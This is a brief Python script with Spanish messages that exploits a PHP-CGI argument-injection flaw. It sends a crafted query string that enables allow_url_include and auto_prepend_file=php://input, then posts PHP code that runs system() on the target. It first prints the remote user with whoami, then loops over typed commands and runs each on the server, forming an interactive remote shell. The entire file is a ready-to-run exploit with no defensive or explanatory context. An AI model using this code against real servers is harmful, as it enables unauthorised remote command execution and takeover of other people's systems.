import requests

import argparse


def RCE():


	target = input("Please input a target: ")
	if target:  
		vulnerabilidad = "/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
		target = target
		if not target.startswith("http://"):
			target = 'http://'+target
		try:
			exploit = requests.post(target+vulnerabilidad,"<?php system('whoami'); die(); ?>")
			user = exploit.text
			user = user.replace("\n","")
			try:
				while True:
					cmd = input("{}$:".format(user))
					exploit = requests.post(target+vulnerabilidad,"<?php system('{}'); die(); ?>".format(cmd))
					print(exploit.text)
			except KeyboardInterrupt:
				exit()
		except:
			print("Fallo al conectar")
	else:
		print("Introduzca un objetivo")

if __name__ == '__main__':
	RCE()



